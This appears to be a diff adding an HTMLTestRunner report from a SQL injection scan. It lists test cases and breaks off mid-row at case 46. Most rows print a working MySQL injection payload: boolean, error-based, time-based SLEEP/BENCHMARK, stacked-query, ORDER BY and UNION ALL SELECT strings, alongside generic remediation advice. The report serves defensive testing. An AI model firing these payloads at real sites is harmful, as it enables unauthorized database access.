@@ -1,0 +1,272 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+    <title> test 检测报告</title>
+    <meta name="generator" content="HTMLTestRunner 0.8.2.1"/>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <link href="http://libs.baidu.com/bootstrap/3.0.3/css/bootstrap.min.css" rel="stylesheet">
+    <script src="http://libs.baidu.com/jquery/2.0.0/jquery.min.js"></script>
+    <script src="http://libs.baidu.com/bootstrap/3.0.3/js/bootstrap.min.js"></script>
+    
+<style type="text/css" media="screen">
+body        { font-family: Microsoft YaHei,Tahoma,arial,helvetica,sans-serif;padding: 20px; font-size: 80%; }
+table       { font-size: 100%; }
+
+/* -- heading ---------------------------------------------------------------------- */
+.heading {
+    margin-top: 0ex;
+    margin-bottom: 1ex;
+}
+
+.heading .description {
+    margin-top: 4ex;
+    margin-bottom: 6ex;
+}
+
+/* -- report ------------------------------------------------------------------------ */
+#total_row  { font-weight: bold; }
+.passCase   { color: #5cb85c; }
+.failCase   { color: #d9534f; font-weight: bold; }
+.errorCase  { color: #f0ad4e; font-weight: bold; }
+.hiddenRow  { display: none; }
+.testcase   { margin-left: 2em; }
+</style>
+
+</head>
+<body >
+<script language="javascript" type="text/javascript">
+output_list = Array();
+
+/*level 调整增加只显示通过用例的分类 --Findyou
+0:Summary //all hiddenRow
+1:Failed  //pt hiddenRow, ft none
+2:Pass    //pt none, ft hiddenRow
+3:All     //pt none, ft none
+*/
+function showCase(level) {
+    trs = document.getElementsByTagName("tr");
+    for (var i = 0; i < trs.length; i++) {
+        tr = trs[i];
+        id = tr.id;
+        if (id.substr(0,2) == 'ft') {
+            if (level == 2 || level == 0 ) {
+                tr.className = 'hiddenRow';
+            }
+            else {
+                tr.className = '';
+            }
+        }
+        if (id.substr(0,2) == 'pt') {
+            if (level < 2) {
+                tr.className = 'hiddenRow';
+            }
+            else {
+                tr.className = '';
+            }
+        }
+    }
+
+    //加入【详细】切换文字变化 --Findyou
+    detail_class=document.getElementsByClassName('detail');
+	//console.log(detail_class.length)
+	if (level == 3) {
+		for (var i = 0; i < detail_class.length; i++){
+			detail_class[i].innerHTML="收起"
+		}
+	}
+	else{
+			for (var i = 0; i < detail_class.length; i++){
+			detail_class[i].innerHTML="详细"
+		}
+	}
+}
+
+function showClassDetail(cid, count) {
+    var id_list = Array(count);
+    var toHide = 1;
+    for (var i = 0; i < count; i++) {
+        //ID修改 点 为 下划线 -Findyou
+        tid0 = 't' + cid.substr(1) + '_' + (i+1);
+        tid = 'f' + tid0;
+        tr = document.getElementById(tid);
+        if (!tr) {
+            tid = 'p' + tid0;
+            tr = document.getElementById(tid);
+        }
+        id_list[i] = tid;
+        if (tr.className) {
+            toHide = 0;
+        }
+    }
+    for (var i = 0; i < count; i++) {
+        tid = id_list[i];
+        //修改点击无法收起的BUG，加入【详细】切换文字变化 --Findyou
+        if (toHide) {
+            document.getElementById(tid).className = 'hiddenRow';
+            document.getElementById(cid).innerText = "详细"
+        }
+        else {
+            document.getElementById(tid).className = '';
+            document.getElementById(cid).innerText = "收起"
+        }
+    }
+}
+
+function html_escape(s) {
+    s = s.replace(/&/g,'&amp;');
+    s = s.replace(/</g,'&lt;');
+    s = s.replace(/>/g,'&gt;');
+    return s;
+}
+</script>
+<div class='heading'>
+<h1 style="font-family: Microsoft YaHei"> test 检测报告</h1>
+<br/>
+<p class='attribute'><strong>测试人员 : </strong> root </p>
+<p class='attribute'><strong>开始时间 : </strong> 2018-03-22 14:45:37</p>
+<p class='attribute'><strong>合计耗时 : </strong> 0:00:03</p>
+<p class='attribute'><strong>测试结果 : </strong> 共 52，验证 43，验证率 = 82.69%</p>
+<br/>
+</div>
+
+<p id='show_detail_line'>
+<a class="btn btn-primary" href='javascript:showCase(0)'>概要{ 82.69% }</a>
+<a class="btn btn-danger" href='javascript:showCase(1)'>检测{ 43 }</a>
+<a class="btn btn-success" href='javascript:showCase(2)'>正常{ 9 }</a>
+<a class="btn btn-info" href='javascript:showCase(3)'>所有{ 52 }</a>
+</p>
+<table id='result_table' class="table table-condensed table-bordered table-hover">
+<colgroup>
+<col align='left' />
+<col align='right' />
+<col align='right' />
+<col align='right' />
+<col align='right' />
+<col align='right' />
+</colgroup>
+<tr id='header_row' class="text-center success" style="font-weight: bold;font-size: 14px;">
+    <td>用例集/测试用例</td>
+    <td>总计</td>
+    <td>通过</td>
+    <td>验证</td>
+    <td>错误</td>
+    <td>详细</td>
+</tr>
+
+<tr class='passClass warning'>
+    <td>test</td>
+    <td class="text-center">52</td>
+    <td class="text-center">43</td>
+    <td class="text-center">9</td>
+    <td class="text-center">0</td>
+    <td class="text-center"><a href="javascript:showClassDetail('c1',2)" class="detail" id='c1'>详细</a></td>
+</tr>
+
+<tr id='pt1_1' class='hiddenRow'>
+    <td class='passCase'><div class='testcase'>1)("()"("')</div></td>
+    <td colspan='5' align='center'><span class="label label-success success">通过</span></td>
+</tr>
+<tr id='pt1_2' class='hiddenRow'>
+    <td class='passCase'><div class='testcase'>1'uVzhwm<'">DICtdg</div></td>
+    <td colspan='5' align='center'><span class="label label-success success">通过</span></td>
+</tr>
+
+<tr id='ft1_3' class='none'>
+    <td class='failCase'><div class='testcase'>1) AND 2472=4049 AND (8072=8072</div></td>
+    <td colspan='5' align='center'>
+    <button id='btn_ft1_3' type="button"  class="btn btn-danger btn-xs collapsed" data-toggle="collapse" data-target='#div_ft1_3'>验证</button>
+    <div id='div_ft1_3' class="collapse">
+    <pre>
+原因： 1.没有正确过滤转义字符 2.用户输入错误的数据类型 3.数据库服务器中的漏洞 4.盲目SQL注入式攻击 5.条件响应 6.条件性差错 7.时间延误
+解决建议： 1.用预编译处理语言  2.轨范出错处理  3.使用专业的漏洞扫描工具
+    </pre>
+    </div>
+    </td>
+</tr>
+<tr id='ft1_4' class='none'><td class='failCase'><div class='testcase'>1) AND 6661=6661 AND (3964=3964
+</div></td><td colspan='5' align='center'><button id='btn_ft1_4' type="button"  class="btn btn-danger btn-xs collapsed" data-toggle="collapse" data-target='#div_ft1_4'>验证</button><div id='div_ft1_4' class="collapse"><pre>原因： 1.没有正确过滤转义字符 2.用户输入错误的数据类型 3.数据库服务器中的漏洞 4.盲目SQL注入式攻击 5.条件响应 6.条件性差错 7.时间延误解决建议： 1.用预编译处理语言  2.轨范出错处理  3.使用专业的漏洞扫描工具</pre></div></td></tr>
+<tr id='ft1_5' class='none'><td class='failCase'><div class='testcase'>1 AND 1907=3557</div></td><td colspan='5' align='center'><button id='btn_ft1_5' type="button"  class="btn btn-danger btn-xs collapsed" data-toggle="collapse" data-target='#div_ft1_5'>验证</button><div id='div_ft1_5' class="collapse"><pre>原因： 1.没有正确过滤转义字符 2.用户输入错误的数据类型 3.数据库服务器中的漏洞 4.盲目SQL注入式攻击 5.条件响应 6.条件性差错 7.时间延误解决建议： 1.用预编译处理语言  2.轨范出错处理  3.使用专业的漏洞扫描工具</pre></div></td></tr>
+<tr id='ft1_6' class='none'><td class='failCase'><div class='testcase'>1 AND 6661=6661</div></td><td colspan='5' align='center'><button id='btn_ft1_6' type="button"  class="btn btn-danger btn-xs collapsed" data-toggle="collapse" data-target='#div_ft1_6'>验证</button><div id='div_ft1_6' class="collapse"><pre>原因： 1.没有正确过滤转义字符 2.用户输入错误的数据类型 3.数据库服务器中的漏洞 4.盲目SQL注入式攻击 5.条件响应 6.条件性差错 7.时间延误解决建议： 1.用预编译处理语言  2.轨范出错处理  3.使用专业的漏洞扫描工具</pre></div></td></tr>
+<tr id='ft1_7' class='none'><td class='failCase'><div class='testcase'>1 AND 7874=1299-- hIPz</div></td><td colspan='5' align='center'><button id='btn_ft1_7' type="button"  class="btn btn-danger btn-xs collapsed" data-toggle="collapse" data-target='#div_ft1_7'>验证</button><div id='div_ft1_7' class="collapse"><pre>原因： 1.没有正确过滤转义字符 2.用户输入错误的数据类型 3.数据库服务器中的漏洞 4.盲目SQL注入式攻击 5.条件响应 6.条件性差错 7.时间延误解决建议： 1.用预编译处理语言  2.轨范出错处理  3.使用专业的漏洞扫描工具</pre></div></td></tr>
+<tr id='ft1_8' class='none'><td class='failCase'><div class='testcase'>1 AND 6661=6661-- hHHJ</div></td><td colspan='5' align='center'><button id='btn_ft1_8' type="button"  class="btn btn-danger btn-xs collapsed" data-toggle="collapse" data-target='#div_ft1_8'>验证</button><div id='div_ft1_8' class="collapse"><pre>原因： 1.没有正确过滤转义字符 2.用户输入错误的数据类型 3.数据库服务器中的漏洞 4.盲目SQL注入式攻击 5.条件响应 6.条件性差错 7.时间延误解决建议： 1.用预编译处理语言  2.轨范出错处理  3.使用专业的漏洞扫描工具</pre></div></td></tr>
+<tr id='ft1_9' class='none'><td class='failCase'><div class='testcase'>1') AND 5604=7917 AND ('yEDp'='yEDp</div></td><td colspan='5' align='center'><button id='btn_ft1_9' type="button"  class="btn btn-danger btn-xs collapsed" data-toggle="collapse" data-target='#div_ft1_9'>验证</button><div id='div_ft1_9' class="collapse"><pre>原因： 1.没有正确过滤转义字符 2.用户输入错误的数据类型 3.数据库服务器中的漏洞 4.盲目SQL注入式攻击 5.条件响应 6.条件性差错 7.时间延误解决建议： 1.用预编译处理语言  2.轨范出错处理  3.使用专业的漏洞扫描工具</pre></div></td></tr>
+<tr id='ft1_10' class='none'><td class='failCase'><div class='testcase'>1') AND 6661=6661 AND ('TGfe'='TGfe</div></td><td colspan='5' align='center'><button id='btn_ft1_10' type="button"  class="btn btn-danger btn-xs collapsed" data-toggle="collapse" data-target='#div_ft1_10'>验证</button><div id='div_ft1_10' class="collapse"><pre>原因： 1.没有正确过滤转义字符 2.用户输入错误的数据类型 3.数据库服务器中的漏洞 4.盲目SQL注入式攻击 5.条件响应 6.条件性差错 7.时间延误解决建议： 1.用预编译处理语言  2.轨范出错处理  3.使用专业的漏洞扫描工具</pre></div></td></tr>
+<tr id='ft1_11' class='none'><td class='failCase'><div class='testcase'>1' AND 9587=5282 AND 'OrsJ'='OrsJ</div></td><td colspan='5' align='center'><button id='btn_ft1_11' type="button"  class="btn btn-danger btn-xs collapsed" data-toggle="collapse" data-target='#div_ft1_11'>验证</button><div id='div_ft1_11' class="collapse"><pre>原因： 1.没有正确过滤转义字符 2.用户输入错误的数据类型 3.数据库服务器中的漏洞 4.盲目SQL注入式攻击 5.条件响应 6.条件性差错 7.时间延误解决建议： 1.用预编译处理语言  2.轨范出错处理  3.使用专业的漏洞扫描工具</pre></div></td></tr>
+<tr id='ft1_12' class='none'><td class='failCase'><div class='testcase'>1' AND 6661=6661 AND 'jPqm'='jPqm</div></td><td colspan='5' align='center'><button id='btn_ft1_12' type="button"  class="btn btn-danger btn-xs collapsed" data-toggle="collapse" data-target='#div_ft1_12'>验证</button><div id='div_ft1_12' class="collapse"><pre>原因： 1.没有正确过滤转义字符 2.用户输入错误的数据类型 3.数据库服务器中的漏洞 4.盲目SQL注入式攻击 5.条件响应 6.条件性差错 7.时间延误解决建议： 1.用预编译处理语言  2.轨范出错处理  3.使用专业的漏洞扫描工具</pre></div></td></tr>
+<tr id='ft1_13' class='none'><td class='failCase'><div class='testcase'>1' AND 4390=7810 AND 'ToGH'='ToGH</div></td><td colspan='5' align='center'><button id='btn_ft1_13' type="button"  class="btn btn-danger btn-xs collapsed" data-toggle="collapse" data-target='#div_ft1_13'>验证</button><div id='div_ft1_13' class="collapse"><pre>原因： 1.没有正确过滤转义字符 2.用户输入错误的数据类型 3.数据库服务器中的漏洞 4.盲目SQL注入式攻击 5.条件响应 6.条件性差错 7.时间延误解决建议： 1.用预编译处理语言  2.轨范出错处理  3.使用专业的漏洞扫描工具</pre></div></td></tr>
+<tr id='ft1_14' class='none'><td class='failCase'><div class='testcase'>1' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b6a7871,(SELECT (ELT(2525=2525,1))),0x7162766b71,0x78))s), 8446744073709551610, 8446744073709551610))) AND 'dXtE'='dXtE
+</div></td><td colspan='5' align='center'><button id='btn_ft1_14' type="button"  class="btn btn-danger btn-xs collapsed" data-toggle="collapse" data-target='#div_ft1_14'>验证</button><div id='div_ft1_14' class="collapse"><pre>原因： 1.没有正确过滤转义字符 2.用户输入错误的数据类型 3.数据库服务器中的漏洞 4.盲目SQL注入式攻击 5.条件响应 6.条件性差错 7.时间延误解决建议： 1.用预编译处理语言  2.轨范出错处理  3.使用专业的漏洞扫描工具</pre></div></td></tr>
+<tr id='ft1_15' class='none'><td class='failCase'><div class='testcase'>1' OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b6a7871,(SELECT (ELT(7157=7157,1))),0x7162766b71,0x78))s), 8446744073709551610, 8446744073709551610))) AND 'xhnt'='xhnt
+</div></td><td colspan='5' align='center'><button id='btn_ft1_15' type="button"  class="btn btn-danger btn-xs collapsed" data-toggle="collapse" data-target='#div_ft1_15'>验证</button><div id='div_ft1_15' class="collapse"><pre>原因： 1.没有正确过滤转义字符 2.用户输入错误的数据类型 3.数据库服务器中的漏洞 4.盲目SQL注入式攻击 5.条件响应 6.条件性差错 7.时间延误解决建议： 1.用预编译处理语言  2.轨范出错处理  3.使用专业的漏洞扫描工具</pre></div></td></tr>
+<tr id='ft1_16' class='none'><td class='failCase'><div class='testcase'>1' AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716b6a7871,(SELECT (ELT(2740=2740,1))),0x7162766b71,0x78))x)) AND 'tusM'='tusM
+</div></td><td colspan='5' align='center'><button id='btn_ft1_16' type="button"  class="btn btn-danger btn-xs collapsed" data-toggle="collapse" data-target='#div_ft1_16'>验证</button><div id='div_ft1_16' class="collapse"><pre>原因： 1.没有正确过滤转义字符 2.用户输入错误的数据类型 3.数据库服务器中的漏洞 4.盲目SQL注入式攻击 5.条件响应 6.条件性差错 7.时间延误解决建议： 1.用预编译处理语言  2.轨范出错处理  3.使用专业的漏洞扫描工具</pre></div></td></tr>
+<tr id='ft1_17' class='none'><td class='failCase'><div class='testcase'>1' OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716b6a7871,(SELECT (ELT(8931=8931,1))),0x7162766b71,0x78))x)) AND 'McAm'='McAm
+</div></td><td colspan='5' align='center'><button id='btn_ft1_17' type="button"  class="btn btn-danger btn-xs collapsed" data-toggle="collapse" data-target='#div_ft1_17'>验证</button><div id='div_ft1_17' class="collapse"><pre>原因： 1.没有正确过滤转义字符 2.用户输入错误的数据类型 3.数据库服务器中的漏洞 4.盲目SQL注入式攻击 5.条件响应 6.条件性差错 7.时间延误解决建议： 1.用预编译处理语言  2.轨范出错处理  3.使用专业的漏洞扫描工具</pre></div></td></tr>
+<tr id='ft1_18' class='none'><td class='failCase'><div class='testcase'>1' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716b6a7871,(SELECT (ELT(8530=8530,1))),0x7162766b71)) USING utf8))) AND 'jwhU'='jwhU
+</div></td><td colspan='5' align='center'><button id='btn_ft1_18' type="button"  class="btn btn-danger btn-xs collapsed" data-toggle="collapse" data-target='#div_ft1_18'>验证</button><div id='div_ft1_18' class="collapse"><pre>原因： 1.没有正确过滤转义字符 2.用户输入错误的数据类型 3.数据库服务器中的漏洞 4.盲目SQL注入式攻击 5.条件响应 6.条件性差错 7.时间延误解决建议： 1.用预编译处理语言  2.轨范出错处理  3.使用专业的漏洞扫描工具</pre></div></td></tr>
+<tr id='ft1_19' class='none'><td class='failCase'><div class='testcase'>1' OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716b6a7871,(SELECT (ELT(7560=7560,1))),0x7162766b71)) USING utf8))) AND 'HJsA'='HJsA
+</div></td><td colspan='5' align='center'><button id='btn_ft1_19' type="button"  class="btn btn-danger btn-xs collapsed" data-toggle="collapse" data-target='#div_ft1_19'>验证</button><div id='div_ft1_19' class="collapse"><pre>原因： 1.没有正确过滤转义字符 2.用户输入错误的数据类型 3.数据库服务器中的漏洞 4.盲目SQL注入式攻击 5.条件响应 6.条件性差错 7.时间延误解决建议： 1.用预编译处理语言  2.轨范出错处理  3.使用专业的漏洞扫描工具</pre></div></td></tr>
+<tr id='ft1_20' class='none'><td class='failCase'><div class='testcase'>1' AND (SELECT 2971 FROM(SELECT COUNT(*),CONCAT(0x716b6a7871,(SELECT (ELT(2971=2971,1))),0x7162766b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'uabZ'='uabZ
+</div></td><td colspan='5' align='center'><button id='btn_ft1_20' type="button"  class="btn btn-danger btn-xs collapsed" data-toggle="collapse" data-target='#div_ft1_20'>验证</button><div id='div_ft1_20' class="collapse"><pre>原因： 1.没有正确过滤转义字符 2.用户输入错误的数据类型 3.数据库服务器中的漏洞 4.盲目SQL注入式攻击 5.条件响应 6.条件性差错 7.时间延误解决建议： 1.用预编译处理语言  2.轨范出错处理  3.使用专业的漏洞扫描工具</pre></div></td></tr>
+<tr id='ft1_21' class='none'><td class='failCase'><div class='testcase'>(SELECT CONCAT(0x716b6a7871,(SELECT (ELT(5400=5400,1))),0x7162766b71))
+</div></td><td colspan='5' align='center'><button id='btn_ft1_21' type="button"  class="btn btn-danger btn-xs collapsed" data-toggle="collapse" data-target='#div_ft1_21'>验证</button><div id='div_ft1_21' class="collapse"><pre>原因： 1.没有正确过滤转义字符 2.用户输入错误的数据类型 3.数据库服务器中的漏洞 4.盲目SQL注入式攻击 5.条件响应 6.条件性差错 7.时间延误解决建议： 1.用预编译处理语言  2.轨范出错处理  3.使用专业的漏洞扫描工具</pre></div></td></tr>
+<tr id = 'pt1_22' class ='hiddenRow' ><td class ='passCase' > <div class ='testcase' >1</div></td><td colspan = '5' align = 'center' > <span class ="label label-success success" > 通过 </span > </td ></tr >
+<tr id = 'pt1_23' class ='hiddenRow' ><td class ='passCase' > <div class ='testcase' >1</div></td><td colspan = '5' align = 'center' > <span class ="label label-success success" > 通过 </span > </td ></tr >
+<tr id = 'pt1_24' class ='hiddenRow' ><td class ='passCase' > <div class ='testcase' >1</div></td><td colspan = '5' align = 'center' > <span class ="label label-success success" > 通过 </span > </td ></tr >
+<tr id = 'pt1_25' class ='hiddenRow' ><td class ='passCase' > <div class ='testcase' >1</div></td><td colspan = '5' align = 'center' > <span class ="label label-success success" > 通过 </span > </td ></tr >
+<tr id = 'pt1_26' class ='hiddenRow' ><td class ='passCase' > <div class ='testcase' >1</div></td><td colspan = '5' align = 'center' > <span class ="label label-success success" > 通过 </span > </td ></tr >
+<tr id = 'pt1_27' class ='hiddenRow' ><td class ='passCase' > <div class ='testcase' >1</div></td><td colspan = '5' align = 'center' > <span class ="label label-success success" > 通过 </span > </td ></tr >
+<tr id = 'pt1_28' class ='hiddenRow' ><td class ='passCase' > <div class ='testcase' >1</div></td><td colspan = '5' align = 'center' > <span class ="label label-success success" > 通过 </span > </td ></tr >
+<tr id='ft1_29' class='none'><td class='failCase'><div class='testcase'>1';SELECT SLEEP(5)#</div></td><td colspan='5' align='center'><button id='btn_ft1_29' type="button"  class="btn btn-danger btn-xs collapsed" data-toggle="collapse" data-target='#div_ft1_29'>验证</button><div id='div_ft1_29' class="collapse"><pre>原因： 1.没有正确过滤转义字符 2.用户输入错误的数据类型 3.数据库服务器中的漏洞 4.盲目SQL注入式攻击 5.条件响应 6.条件性差错 7.时间延误解决建议： 1.用预编译处理语言  2.轨范出错处理  3.使用专业的漏洞扫描工具</pre></div></td></tr>
+<tr id='ft1_30' class='none'><td class='failCase'><div class='testcase'>1';SELECT SLEEP(5) AND 'MWOg'='MWOg</div></td><td colspan='5' align='center'><button id='btn_ft1_30' type="button"  class="btn btn-danger btn-xs collapsed" data-toggle="collapse" data-target='#div_ft1_30'>验证</button><div id='div_ft1_30' class="collapse"><pre>原因： 1.没有正确过滤转义字符 2.用户输入错误的数据类型 3.数据库服务器中的漏洞 4.盲目SQL注入式攻击 5.条件响应 6.条件性差错 7.时间延误解决建议： 1.用预编译处理语言  2.轨范出错处理  3.使用专业的漏洞扫描工具</pre></div></td></tr>
+<tr id='ft1_31' class='none'><td class='failCase'><div class='testcase'>1';(SELECT * FROM (SELECT(SLEEP(5)))vcdZ)#</div></td><td colspan='5' align='center'><button id='btn_ft1_31' type="button"  class="btn btn-danger btn-xs collapsed" data-toggle="collapse" data-target='#div_ft1_31'>验证</button><div id='div_ft1_31' class="collapse"><pre>原因： 1.没有正确过滤转义字符 2.用户输入错误的数据类型 3.数据库服务器中的漏洞 4.盲目SQL注入式攻击 5.条件响应 6.条件性差错 7.时间延误解决建议： 1.用预编译处理语言  2.轨范出错处理  3.使用专业的漏洞扫描工具</pre></div></td></tr>
+<tr id='ft1_32' class='none'><td class='failCase'><div class='testcase'>1';(SELECT * FROM (SELECT(SLEEP(5)))KzsK) AND 'ueyb'='ueyb</div></td><td colspan='5' align='center'><button id='btn_ft1_32' type="button"  class="btn btn-danger btn-xs collapsed" data-toggle="collapse" data-target='#div_ft1_32'>验证</button><div id='div_ft1_32' class="collapse"><pre>原因： 1.没有正确过滤转义字符 2.用户输入错误的数据类型 3.数据库服务器中的漏洞 4.盲目SQL注入式攻击 5.条件响应 6.条件性差错 7.时间延误解决建议： 1.用预编译处理语言  2.轨范出错处理  3.使用专业的漏洞扫描工具</pre></div></td></tr>
+<tr id='ft1_33' class='none'><td class='failCase'><div class='testcase'>1';SELECT BENCHMARK(5000000,MD5(0x78584d58))#</div></td><td colspan='5' align='center'><button id='btn_ft1_33' type="button"  class="btn btn-danger btn-xs collapsed" data-toggle="collapse" data-target='#div_ft1_33'>验证</button><div id='div_ft1_33' class="collapse"><pre>原因： 1.没有正确过滤转义字符 2.用户输入错误的数据类型 3.数据库服务器中的漏洞 4.盲目SQL注入式攻击 5.条件响应 6.条件性差错 7.时间延误解决建议： 1.用预编译处理语言  2.轨范出错处理  3.使用专业的漏洞扫描工具</pre></div></td></tr>
+<tr id='ft1_34' class='none'><td class='failCase'><div class='testcase'>1';SELECT BENCHMARK(5000000,MD5(0x6f704e66)) AND 'endX'='endX</div></td><td colspan='5' align='center'><button id='btn_ft1_34' type="button"  class="btn btn-danger btn-xs collapsed" data-toggle="collapse" data-target='#div_ft1_34'>验证</button><div id='div_ft1_34' class="collapse"><pre>原因： 1.没有正确过滤转义字符 2.用户输入错误的数据类型 3.数据库服务器中的漏洞 4.盲目SQL注入式攻击 5.条件响应 6.条件性差错 7.时间延误解决建议： 1.用预编译处理语言  2.轨范出错处理  3.使用专业的漏洞扫描工具</pre></div></td></tr>
+<tr id='ft1_35' class='none'><td class='failCase'><div class='testcase'>1' AND SLEEP(5) AND 'SBqt'='SBqt</div></td><td colspan='5' align='center'><button id='btn_ft1_35' type="button"  class="btn btn-danger btn-xs collapsed" data-toggle="collapse" data-target='#div_ft1_35'>验证</button><div id='div_ft1_35' class="collapse"><pre>原因： 1.没有正确过滤转义字符 2.用户输入错误的数据类型 3.数据库服务器中的漏洞 4.盲目SQL注入式攻击 5.条件响应 6.条件性差错 7.时间延误解决建议： 1.用预编译处理语言  2.轨范出错处理  3.使用专业的漏洞扫描工具</pre></div></td></tr>
+<tr id='ft1_36' class='none'><td class='failCase'><div class='testcase'>1' AND SLEEP(0) AND 'SBqt'='SBqt</div></td><td colspan='5' align='center'><button id='btn_ft1_36' type="button"  class="btn btn-danger btn-xs collapsed" data-toggle="collapse" data-target='#div_ft1_36'>验证</button><div id='div_ft1_36' class="collapse"><pre>原因： 1.没有正确过滤转义字符 2.用户输入错误的数据类型 3.数据库服务器中的漏洞 4.盲目SQL注入式攻击 5.条件响应 6.条件性差错 7.时间延误解决建议： 1.用预编译处理语言  2.轨范出错处理  3.使用专业的漏洞扫描工具</pre></div></td></tr>
+<tr id='ft1_37' class='none'><td class='failCase'><div class='testcase'>1' AND SLEEP(5) AND 'SBqt'='SBqt</div></td><td colspan='5' align='center'><button id='btn_ft1_37' type="button"  class="btn btn-danger btn-xs collapsed" data-toggle="collapse" data-target='#div_ft1_37'>验证</button><div id='div_ft1_37' class="collapse"><pre>原因： 1.没有正确过滤转义字符 2.用户输入错误的数据类型 3.数据库服务器中的漏洞 4.盲目SQL注入式攻击 5.条件响应 6.条件性差错 7.时间延误解决建议： 1.用预编译处理语言  2.轨范出错处理  3.使用专业的漏洞扫描工具</pre></div></td></tr>
+<tr id='ft1_38' class='none'><td class='failCase'><div class='testcase'>1' ORDER BY 1-- mXlr</div></td><td colspan='5' align='center'><button id='btn_ft1_38' type="button"  class="btn btn-danger btn-xs collapsed" data-toggle="collapse" data-target='#div_ft1_38'>验证</button><div id='div_ft1_38' class="collapse"><pre>原因： 1.没有正确过滤转义字符 2.用户输入错误的数据类型 3.数据库服务器中的漏洞 4.盲目SQL注入式攻击 5.条件响应 6.条件性差错 7.时间延误解决建议： 1.用预编译处理语言  2.轨范出错处理  3.使用专业的漏洞扫描工具</pre></div></td></tr>
+<tr id='ft1_39' class='none'><td class='failCase'><div class='testcase'>1' ORDER BY 2761-- xLYw</div></td><td colspan='5' align='center'><button id='btn_ft1_39' type="button"  class="btn btn-danger btn-xs collapsed" data-toggle="collapse" data-target='#div_ft1_39'>验证</button><div id='div_ft1_39' class="collapse"><pre>原因： 1.没有正确过滤转义字符 2.用户输入错误的数据类型 3.数据库服务器中的漏洞 4.盲目SQL注入式攻击 5.条件响应 6.条件性差错 7.时间延误解决建议： 1.用预编译处理语言  2.轨范出错处理  3.使用专业的漏洞扫描工具</pre></div></td></tr>
+<tr id='ft1_40' class='none'><td class='failCase'><div class='testcase'>1' ORDER BY 10-- YURF</div></td><td colspan='5' align='center'><button id='btn_ft1_40' type="button"  class="btn btn-danger btn-xs collapsed" data-toggle="collapse" data-target='#div_ft1_40'>验证</button><div id='div_ft1_40' class="collapse"><pre>原因： 1.没有正确过滤转义字符 2.用户输入错误的数据类型 3.数据库服务器中的漏洞 4.盲目SQL注入式攻击 5.条件响应 6.条件性差错 7.时间延误解决建议： 1.用预编译处理语言  2.轨范出错处理  3.使用专业的漏洞扫描工具</pre></div></td></tr>
+<tr id='ft1_41' class='none'><td class='failCase'><div class='testcase'>1' ORDER BY 6-- qNoq</div></td><td colspan='5' align='center'><button id='btn_ft1_41' type="button"  class="btn btn-danger btn-xs collapsed" data-toggle="collapse" data-target='#div_ft1_41'>验证</button><div id='div_ft1_41' class="collapse"><pre>原因： 1.没有正确过滤转义字符 2.用户输入错误的数据类型 3.数据库服务器中的漏洞 4.盲目SQL注入式攻击 5.条件响应 6.条件性差错 7.时间延误解决建议： 1.用预编译处理语言  2.轨范出错处理  3.使用专业的漏洞扫描工具</pre></div></td></tr>
+<tr id='ft1_42' class='none'><td class='failCase'><div class='testcase'>1' ORDER BY 4-- nWui</div></td><td colspan='5' align='center'><button id='btn_ft1_42' type="button"  class="btn btn-danger btn-xs collapsed" data-toggle="collapse" data-target='#div_ft1_42'>验证</button><div id='div_ft1_42' class="collapse"><pre>原因： 1.没有正确过滤转义字符 2.用户输入错误的数据类型 3.数据库服务器中的漏洞 4.盲目SQL注入式攻击 5.条件响应 6.条件性差错 7.时间延误解决建议： 1.用预编译处理语言  2.轨范出错处理  3.使用专业的漏洞扫描工具</pre></div></td></tr>
+<tr id='ft1_43' class='none'><td class='failCase'><div class='testcase'>1' ORDER BY 3-- uWDW</div></td><td colspan='5' align='center'><button id='btn_ft1_43' type="button"  class="btn btn-danger btn-xs collapsed" data-toggle="collapse" data-target='#div_ft1_43'>验证</button><div id='div_ft1_43' class="collapse"><pre>原因： 1.没有正确过滤转义字符 2.用户输入错误的数据类型 3.数据库服务器中的漏洞 4.盲目SQL注入式攻击 5.条件响应 6.条件性差错 7.时间延误解决建议： 1.用预编译处理语言  2.轨范出错处理  3.使用专业的漏洞扫描工具</pre></div></td></tr>
+<tr id='ft1_44' class='none'><td class='failCase'><div class='testcase'>1' UNION ALL SELECT CONCAT(0x716b6a7871,0x516c52564e6546576e4d575564676152464d76644d594f494b6b72684e776e6d77436c477563434b,0x7162766b71),NULL,NULL-- pTco
+</div></td><td colspan='5' align='center'><button id='btn_ft1_44' type="button"  class="btn btn-danger btn-xs collapsed" data-toggle="collapse" data-target='#div_ft1_44'>验证</button><div id='div_ft1_44' class="collapse"><pre>原因： 1.没有正确过滤转义字符 2.用户输入错误的数据类型 3.数据库服务器中的漏洞 4.盲目SQL注入式攻击 5.条件响应 6.条件性差错 7.时间延误解决建议： 1.用预编译处理语言  2.轨范出错处理  3.使用专业的漏洞扫描工具</pre></div></td></tr>
+<tr id='ft1_45' class='none'><td class='failCase'><div class='testcase'>1' UNION ALL SELECT NULL,CONCAT(0x716b6a7871,0x686c71696d49436a4e526c4f5074534447775156496c6e6d464f6e41737945584c6f754659794773,0x7162766b71),NULL-- sDYO
+</div></td><td colspan='5' align='center'><button id='btn_ft1_45' type="button"  class="btn btn-danger btn-xs collapsed" data-toggle="collapse" data-target='#div_ft1_45'>验证</button><div id='div_ft1_45' class="collapse"><pre>原因： 1.没有正确过滤转义字符 2.用户输入错误的数据类型 3.数据库服务器中的漏洞 4.盲目SQL注入式攻击 5.条件响应 6.条件性差错 7.时间延误解决建议： 1.用预编译处理语言  2.轨范出错处理  3.使用专业的漏洞扫描工具</pre></div></td></tr>
+<tr id='ft1_46' class='none'><td class='failCase'><div class='testcase'>1' UNION ALL SELECT NULL,NULL,CONCAT(0x716b6a7871,0x4a77716451586e6c4d446d454370784c776166537a525178516a74595a544d6f6e7a4c674f414f78,0x7162766b71)-- SJYr
